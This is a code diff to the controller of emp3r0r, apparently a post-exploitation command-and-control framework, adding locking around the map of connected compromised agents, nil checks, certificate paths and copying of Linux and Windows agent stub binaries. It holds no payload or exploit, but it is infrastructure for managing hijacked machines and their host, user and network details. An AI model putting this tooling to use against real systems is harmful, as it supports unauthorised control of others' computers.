@@ -1,10 +1,12 @@
+//go:build linux
+// +build linux
+
 package cc
 
 import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/user"
 	"strings"
@@ -44,7 +46,14 @@ var (
 	EmpConfigFile = ""
 
 	// Targets target list, with control (tun) interface
-	Targets = make(map[*emp3r0r_data.AgentSystemInfo]*Control)
+	Targets      = make(map[*emp3r0r_data.AgentSystemInfo]*Control)
+	TargetsMutex = sync.RWMutex{}
+
+	// certs
+	CACrtFile     string
+	CAKeyFile     string
+	ServerCrtFile string
+	ServerKeyFile string
 )
 
 const (
@@ -54,8 +63,8 @@ const (
 	// WWWRoot host static files for agent
 	WWWRoot = Temp + "www/"
 
-	// UtilsArchive host utils.tar.bz2 for agent
-	UtilsArchive = WWWRoot + "utils.tar.bz2"
+	// UtilsArchive host utils.tar.xz for agent
+	UtilsArchive = WWWRoot + "utils.tar.xz"
 )
 
 // Control controller interface of a target
@@ -69,6 +78,8 @@ type Control struct {
 
 // send JSON encoded target list to frontend
 func headlessListTargets() (err error) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	var targets []emp3r0r_data.AgentSystemInfo
 	for target := range Targets {
 		targets = append(targets, *target)
@@ -92,6 +103,8 @@ func headlessListTargets() (err error) {
 
 // ListTargets list currently connected agents
 func ListTargets() {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	// return JSON data to APIConn in headless mode
 	if IsAPIEnabled {
 		if err := headlessListTargets(); err != nil {
@@ -189,13 +202,31 @@ func ListTargets() {
 	AgentListPane.Printf(true, "\n\033[0m%s\n\n", tableString.String())
 }
 
+// Update agent list, then switch to its tmux window
+func ls_targets() {
+	ListTargets()
+	TmuxSwitchWindow(AgentListPane.WindowID)
+}
+
 func GetTargetDetails(target *emp3r0r_data.AgentSystemInfo) {
+	// nil?
+	if target == nil {
+		CliPrintDebug("Target is nil")
+		return
+	}
+
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	// exists?
 	if !IsAgentExist(target) {
 		CliPrintError("Target does not exist")
 		return
 	}
 	control := Targets[target]
+	if control == nil {
+		CliPrintError("Target control interface does not exist")
+		return
+	}
 
 	// build table
 	tdata := [][]string{}
@@ -223,8 +254,8 @@ func GetTargetDetails(target *emp3r0r_data.AgentSystemInfo) {
 		userInfo = color.HiGreenString(target.User)
 	}
 	userInfo = util.SplitLongLine(userInfo, 20)
-	cpuinfo := color.HiMagentaString(target.CPU)
-	gpuinfo := color.HiMagentaString(target.GPU)
+	cpuinfo := target.CPU
+	gpuinfo := target.GPU
 	gpuinfo = util.SplitLongLine(gpuinfo, 20)
 
 	// agent process info
@@ -233,23 +264,30 @@ func GetTargetDetails(target *emp3r0r_data.AgentSystemInfo) {
 		agentProc.Cmdline, agentProc.PID, agentProc.Parent, agentProc.PPID)
 	procInfo = util.SplitLongLine(procInfo, 20)
 
+	// serial number
+	serial_no := "N/A"
+	if target.Product != nil {
+		serial_no = target.Product.SerialNumber
+	}
+
 	// info map
 	infoMap := map[string]string{
-		"Version":   color.HiWhiteString(target.Version),
-		"Hostname":  util.SplitLongLine(color.HiCyanString(target.Hostname), 20),
-		"Process":   util.SplitLongLine(color.HiMagentaString(procInfo), 20),
+		"Version":   fmt.Sprintf(target.Version),
+		"Hostname":  util.SplitLongLine(fmt.Sprintf(target.Hostname), 20),
+		"Process":   util.SplitLongLine(fmt.Sprintf(procInfo), 20),
 		"User":      userInfo,
 		"Internet":  hasInternet,
 		"CPU":       cpuinfo,
 		"GPU":       gpuinfo,
 		"MEM":       target.Mem,
-		"Hardware":  util.SplitLongLine(color.HiCyanString(target.Hardware), 20),
+		"Hardware":  util.SplitLongLine(fmt.Sprintf(target.Hardware), 20),
+		"Serial":    util.SplitLongLine(fmt.Sprintf(serial_no), 20),
 		"Container": target.Container,
-		"OS":        util.SplitLongLine(color.HiWhiteString(target.OS), 20),
-		"Kernel":    util.SplitLongLine(color.HiBlueString(target.Kernel)+", "+color.HiWhiteString(target.Arch), 20),
-		"From":      util.SplitLongLine(color.HiYellowString(target.From)+fmt.Sprintf(" - %s", color.HiGreenString(target.Transport)), 20),
-		"IPs":       color.BlueString(ips),
-		"ARP":       color.HiWhiteString(arpTab),
+		"OS":        util.SplitLongLine(fmt.Sprintf(target.OS), 20),
+		"Kernel":    util.SplitLongLine(fmt.Sprintf(target.Kernel)+", "+fmt.Sprintf(target.Arch), 20),
+		"From":      util.SplitLongLine(fmt.Sprintf(target.From)+fmt.Sprintf(" - %s", fmt.Sprintf(target.Transport)), 20),
+		"IPs":       fmt.Sprintf(ips),
+		"ARP":       fmt.Sprintf(arpTab),
 	}
 
 	// print
@@ -278,7 +316,7 @@ func GetTargetDetails(target *emp3r0r_data.AgentSystemInfo) {
 	}
 	AgentInfoPane.ResizePane("y", num_of_lines)
 	AgentInfoPane.ResizePane("x", num_of_columns)
-	AgentInfoPane.Printf(true, "\n\033[0m%s\n\n", tableString.String())
+	AgentInfoPane.Printf(true, "\n%s\n\n", tableString.String())
 
 	// Update Agent list
 	ListTargets()
@@ -286,6 +324,8 @@ func GetTargetDetails(target *emp3r0r_data.AgentSystemInfo) {
 
 // GetTargetFromIndex find target from Targets via control index, return nil if not found
 func GetTargetFromIndex(index int) (target *emp3r0r_data.AgentSystemInfo) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	for t, ctl := range Targets {
 		if ctl.Index == index {
 			target = t
@@ -297,6 +337,8 @@ func GetTargetFromIndex(index int) (target *emp3r0r_data.AgentSystemInfo) {
 
 // GetTargetFromTag find target from Targets via tag, return nil if not found
 func GetTargetFromTag(tag string) (target *emp3r0r_data.AgentSystemInfo) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	for t := range Targets {
 		if t.Tag == tag {
 			target = t
@@ -308,6 +350,8 @@ func GetTargetFromTag(tag string) (target *emp3r0r_data.AgentSystemInfo) {
 
 // GetTargetFromH2Conn find target from Targets via HTTP2 connection ID, return nil if not found
 func GetTargetFromH2Conn(conn *h2conn.Conn) (target *emp3r0r_data.AgentSystemInfo) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	for t, ctrl := range Targets {
 		if conn == ctrl.Conn {
 			target = t
@@ -331,8 +375,8 @@ func labelAgents() {
 		old           []LabeledAgent
 	)
 	// what if emp3r0r_data.json already have some records
-	if util.IsFileExist(AgentsJSON) {
-		data, err := ioutil.ReadFile(AgentsJSON)
+	if util.IsExist(AgentsJSON) {
+		data, err := os.ReadFile(AgentsJSON)
 		if err != nil {
 			CliPrintWarning("Reading labeled agents: %v", err)
 		}
@@ -376,15 +420,17 @@ outter:
 	}
 
 	// write file
-	err = ioutil.WriteFile(AgentsJSON, data, 0600)
+	err = os.WriteFile(AgentsJSON, data, 0600)
 	if err != nil {
 		CliPrintWarning("Saving labeled agents: %v", err)
 	}
 }
 
 // SetAgentLabel if an agent is already labeled, we can set its label in later sessions
-func SetAgentLabel(a *emp3r0r_data.AgentSystemInfo, mutex *sync.Mutex) (label string) {
-	data, err := ioutil.ReadFile(AgentsJSON)
+func SetAgentLabel(a *emp3r0r_data.AgentSystemInfo) (label string) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
+	data, err := os.ReadFile(AgentsJSON)
 	if err != nil {
 		CliPrintWarning("SetAgentLabel: %v", err)
 		return
@@ -398,8 +444,6 @@ func SetAgentLabel(a *emp3r0r_data.AgentSystemInfo, mutex *sync.Mutex) (label st
 
 	for _, labeled := range labeledAgents {
 		if a.Tag == labeled.Tag {
-			mutex.Lock()
-			defer mutex.Unlock()
 			if Targets[a] != nil {
 				Targets[a].Label = labeled.Label
 			}
@@ -418,6 +462,8 @@ func ListModules() {
 
 // Send2Agent send MsgTunData to agent
 func Send2Agent(data *emp3r0r_data.MsgTunData, agent *emp3r0r_data.AgentSystemInfo) (err error) {
+	TargetsMutex.RLock()
+	defer TargetsMutex.RUnlock()
 	ctrl := Targets[agent]
 	if ctrl == nil {
 		return fmt.Errorf("Send2Agent (%s): Target is not connected", data.Payload)
@@ -431,8 +477,8 @@ func Send2Agent(data *emp3r0r_data.MsgTunData, agent *emp3r0r_data.AgentSystemIn
 	return
 }
 
-// DirSetup set workspace, module directories, etc
-func DirSetup() (err error) {
+// InitConfig set workspace, module directories, etc
+func InitConfig() (err error) {
 	// prefix
 	Prefix = os.Getenv("EMP3R0R_PREFIX")
 	if Prefix == "" {
@@ -443,10 +489,10 @@ func DirSetup() (err error) {
 	EmpBuildDir = EmpDataDir + "/build"
 	CAT = EmpDataDir + "/emp3r0r-cat"
 
-	if !util.IsFileExist(EmpDataDir) {
+	if !util.IsExist(EmpDataDir) {
 		return fmt.Errorf("emp3r0r is not installed correctly: %s not found", EmpDataDir)
 	}
-	if !util.IsFileExist(CAT) {
+	if !util.IsExist(CAT) {
 		return fmt.Errorf("emp3r0r is not installed correctly: %s not found", CAT)
 	}
 
@@ -456,25 +502,35 @@ func DirSetup() (err error) {
 		return fmt.Errorf("Get current user: %v", err)
 	}
 	EmpWorkSpace = fmt.Sprintf("%s/.emp3r0r", u.HomeDir)
-	if !util.IsFileExist(EmpWorkSpace) {
-		err = os.MkdirAll(EmpWorkSpace, 0700)
+	FileGetDir = EmpWorkSpace + "/file-get/"
+	EmpConfigFile = EmpWorkSpace + "/emp3r0r.json"
+	if !util.IsDirExist(EmpWorkSpace) {
+		err = os.MkdirAll(FileGetDir, 0700)
 		if err != nil {
 			return fmt.Errorf("mkdir %s: %v", EmpWorkSpace, err)
 		}
 	}
-	FileGetDir = EmpWorkSpace + "/file-get/"
-	EmpConfigFile = EmpWorkSpace + "/emp3r0r.json"
 
 	// binaries
-	emp3r0r_data.Stub_Linux = EmpWorkSpace + "/stub.exe"
-	emp3r0r_data.Stub_Windows = EmpWorkSpace + "/stub-win.exe"
-	emp3r0r_data.Packer_Stub = EmpWorkSpace + "/packer_stub.exe"
-	emp3r0r_data.Packer_Stub_Windows = EmpWorkSpace + "/packer_stub-win.exe"
+	emp3r0r_data.Stub_Linux = EmpWorkSpace + "/stub"
+	emp3r0r_data.Stub_Windows = EmpWorkSpace + "/stub-win"
+	emp3r0r_data.Stub_Windows_DLL = EmpWorkSpace + "/stub-win-dll"
+
 	// copy stub binaries to ~/.emp3r0r
-	util.Copy(EmpBuildDir+"/stub.exe", emp3r0r_data.Stub_Linux)
-	util.Copy(EmpBuildDir+"/stub-win.exe", emp3r0r_data.Stub_Windows)
-	util.Copy(EmpBuildDir+"/packer_stub-win.exe", emp3r0r_data.Packer_Stub_Windows)
-	util.Copy(EmpBuildDir+"/packer_stub.exe", emp3r0r_data.Packer_Stub)
+	for _, arch := range Arch_List {
+		err := util.Copy(fmt.Sprintf("%s/stub-%s", EmpBuildDir, arch), EmpWorkSpace)
+		if err != nil {
+			CliPrintWarning("Agent stubs: %v", err)
+		}
+	}
+	err = util.Copy(fmt.Sprintf("%s/stub-win-%s", EmpBuildDir, "amd64"), EmpWorkSpace)
+	if err != nil {
+		CliPrintWarning("Agent stubs: %v", err)
+	}
+	err = util.Copy(fmt.Sprintf("%s/stub-win-%s", EmpBuildDir, "386"), EmpWorkSpace)
+	if err != nil {
+		CliPrintWarning("Agent stubs: %v", err)
+	}
 
 	// cd to workspace
 	err = os.Chdir(EmpWorkSpace)
@@ -484,6 +540,12 @@ func DirSetup() (err error) {
 
 	// Module directories
 	ModuleDirs = []string{EmpDataDir + "/modules", EmpWorkSpace + "/modules"}
+
+	// cert files
+	CACrtFile = EmpWorkSpace + "/ca-cert.pem"
+	CAKeyFile = EmpWorkSpace + "/ca-key.pem"
+	ServerCrtFile = EmpWorkSpace + "/emp3r0r-cert.pem"
+	ServerKeyFile = EmpWorkSpace + "/emp3r0r-key.pem"
 
 	return
 }
